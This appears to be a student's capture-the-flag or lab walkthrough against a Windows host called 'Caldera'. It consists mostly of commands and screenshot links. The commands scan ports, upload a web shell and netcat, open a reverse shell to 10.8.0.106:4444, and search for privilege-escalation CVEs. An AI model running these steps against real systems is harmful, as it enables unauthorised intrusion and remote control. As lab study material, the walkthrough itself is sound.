# Caldera 192.168.2.4
## Andrea Zonnekus 18758119

nmap --vv -p- -Pn -sT -sV --open 192.168.2.4

![](caldera_steps2/Aspose.Words.3b30b9b3-702f-4f47-ada4-ebd0393c9fa2.001.png)

![](caldera_steps2/Aspose.Words.3b30b9b3-702f-4f47-ada4-ebd0393c9fa2.002.png)



![](caldera_steps2/Aspose.Words.3b30b9b3-702f-4f47-ada4-ebd0393c9fa2.003.png)

enum4linux -a 192.168.2.4

![](caldera_steps2/Aspose.Words.3b30b9b3-702f-4f47-ada4-ebd0393c9fa2.004.png)

binary 

put cmdasp.aspx

![](caldera_steps2/Aspose.Words.3b30b9b3-702f-4f47-ada4-ebd0393c9fa2.005.png)

systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

![](caldera_steps2/Aspose.Words.3b30b9b3-702f-4f47-ada4-ebd0393c9fa2.006.png)

whoami /priv

![](caldera_steps2/Aspose.Words.3b30b9b3-702f-4f47-ada4-ebd0393c9fa2.007.png)

binary

put nc.exe

![](caldera_steps2/Aspose.Words.3b30b9b3-702f-4f47-ada4-ebd0393c9fa2.008.png)

where -r c:\ nc.exe

![](caldera_steps2/Aspose.Words.3b30b9b3-702f-4f47-ada4-ebd0393c9fa2.009.png)

where -r c:\ powershell.exe

![](caldera_steps2/Aspose.Words.3b30b9b3-702f-4f47-ada4-ebd0393c9fa2.010.png)

c:\inetpub\wwwroot2\nc.exe 10.8.0.106 4444 -e cmd.exe

![](caldera_steps2/Aspose.Words.3b30b9b3-702f-4f47-ada4-ebd0393c9fa2.011.png)

nc -lvnp 4444

![](caldera_steps2/Aspose.Words.3b30b9b3-702f-4f47-ada4-ebd0393c9fa2.012.png)

cd c:\inetpub\wwwroot2

![](caldera_steps2/Aspose.Words.3b30b9b3-702f-4f47-ada4-ebd0393c9fa2.013.png)

systeminfo > info.txt

![](caldera_steps2/Aspose.Words.3b30b9b3-702f-4f47-ada4-ebd0393c9fa2.014.png)

sudo wget <http://192.168.2.4:61240/info.txt>

![](caldera_steps2/Aspose.Words.3b30b9b3-702f-4f47-ada4-ebd0393c9fa2.015.png)

sudo python3 wesng/wes.py info.txt > kernel\_vulns

![](caldera_steps2/Aspose.Words.3b30b9b3-702f-4f47-ada4-ebd0393c9fa2.016.png)



cat kernel\_vulns | grep Privilege -B 5

![](caldera_steps2/Aspose.Words.3b30b9b3-702f-4f47-ada4-ebd0393c9fa2.017.png)

cat kernel\_vulns | grep CVE-2019-0803 -A 4

![](caldera_steps2/Aspose.Words.3b30b9b3-702f-4f47-ada4-ebd0393c9fa2.018.png)

![](caldera_steps2/Aspose.Words.3b30b9b3-702f-4f47-ada4-ebd0393c9fa2.019.png)
